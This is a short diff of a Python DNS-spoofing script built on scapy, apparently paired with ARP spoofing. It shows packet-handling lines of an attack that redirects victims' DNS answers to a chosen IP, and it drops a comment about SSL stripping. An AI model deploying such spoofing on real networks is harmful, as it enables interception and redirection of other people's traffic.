@@ -4,7 +4,6 @@ import arp_spoofing
 import proxy
 
 #currently seems to work on unencrypted requests (eg nike.com, but not https://apple.com)
-#TODO SSL strip first?
 
 destination_ip = "142.250.179.174" #what to spoof the ip to (google.com)
 
@@ -28,7 +27,7 @@ def dns_spoof(packet):
 
     ip_src = packet[scapy.IP].src
     ip_dst = packet[scapy.IP].dst
-    udp_sport = packet[scapy.UDP].sport
+    udp_sport = packet[scapy.UDP].sport #udp is default https://www.infoblox.com/dns-security-resource-center/dns-security-faq/is-dns-tcp-or-udp-port-53/
     udp_dport = packet[scapy.UDP].dport
     dns_id = packet[scapy.DNS].id
     dns_qd = packet[scapy.DNS].qd
